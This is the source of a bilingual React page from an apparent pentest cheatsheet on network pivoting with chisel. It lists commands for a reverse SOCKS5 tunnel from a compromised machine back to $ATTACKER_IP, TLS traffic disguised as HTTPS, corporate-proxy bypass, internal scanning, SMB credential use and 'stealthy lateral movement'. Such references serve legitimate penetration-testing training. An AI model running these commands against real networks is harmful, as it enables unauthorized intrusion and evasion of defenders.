"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function ChiselPage() {
  const { lang } = useLanguage();

  const sections = [
    {
      title: lang === "fr" ? "Tunnel de base" : "Basic Tunnel",
      id: "basic",
      entries: [
        {
          cmd: "chisel server --reverse --port 8080",
          why: lang === "fr"
            ? "Démarrer le serveur chisel en mode reverse : la cible initie la connexion vers nous."
            : "Start chisel server in reverse mode: the target initiates the connection toward us.",
        },
        {
          cmd: "chisel client $ATTACKER_IP:8080 R:socks",
          why: lang === "fr"
            ? "Créer un proxy SOCKS5 reverse : tout le trafic routé via la machine compromise."
            : "Create a reverse SOCKS5 proxy: all traffic routed via the compromised machine.",
        },
        {
          cmd: "chisel client $ATTACKER_IP:8080 R:$LOCAL_PORT:$INTERNAL_HOST:$REMOTE_PORT",
          why: lang === "fr"
            ? "Port forward inverse : exposer un service interne directement sur notre machine."
            : "Reverse port forward: expose an internal service directly on our machine.",
        },
      ],
    },
    {
      title: lang === "fr" ? "Via un proxy HTTP" : "Through HTTP Proxy",
      id: "proxy",
      entries: [
        {
          cmd: "chisel server --reverse --port 443 --tls-cert cert.pem --tls-key key.pem",
          why: lang === "fr"
            ? "Chisel over TLS sur le port 443 : le trafic ressemble à du HTTPS pour les pare-feux."
            : "Chisel over TLS on port 443: traffic looks like HTTPS to firewalls.",
        },
        {
          cmd: "chisel client --proxy $PROXY_URL $ATTACKER_IP:8080 R:socks",
          why: lang === "fr"
            ? "Tunneler chisel via un proxy HTTP d'entreprise : contourner les restrictions réseau."
            : "Tunnel chisel through a corporate HTTP proxy: bypass network restrictions.",
        },
      ],
    },
    {
      title: "Proxychains",
      id: "proxychains",
      entries: [
        {
          cmd: "proxychains4 nxc smb $INTERNAL_TARGET -u $USER -p $PASS",
          why: lang === "fr"
            ? "Utiliser proxychains via le SOCKS5 chisel pour atteindre des hosts internes."
            : "Use proxychains through the chisel SOCKS5 to reach internal hosts.",
        },
        {
          cmd: "proxychains4 -q nmap -sT -Pn -p 22,80,443,445,3389 $INTERNAL_SUBNET",
          why: lang === "fr"
            ? "Scanner le réseau interne via proxychains : -sT obligatoire (pas de raw socket via SOCKS)."
            : "Scan the internal network via proxychains: -sT mandatory (no raw socket via SOCKS).",
        },
        {
          cmd: "proxychains4 ssh $USER@$INTERNAL_HOST",
          why: lang === "fr"
            ? "SSH vers un host interne via le tunnel chisel : mouvement latéral discret."
            : "SSH to an internal host via the chisel tunnel: stealthy lateral movement.",
        },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">Pivoting</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Chisel</h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          {lang === "fr"
            ? "Tunnels TCP/UDP over HTTP avec chisel : SOCKS5 reverse et port forwarding pour pivot réseau."
            : "TCP/UDP tunnels over HTTP with chisel: reverse SOCKS5 and port forwarding for network pivoting."}
        </p>
      </header>
      <div className="space-y-10">
        {sections.map((section) => (
          <section key={section.id} id={section.id}>
            <h2 className="mb-4 border-b border-border pb-2 font-mono text-xs uppercase tracking-widest text-primary">
              {section.title}
            </h2>
            <div className="space-y-4">
              {section.entries.map((item) => (
                <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={item.why} lang={lang} />
              ))}
            </div>
          </section>
        ))}
      </div>
    </div>
  );
}
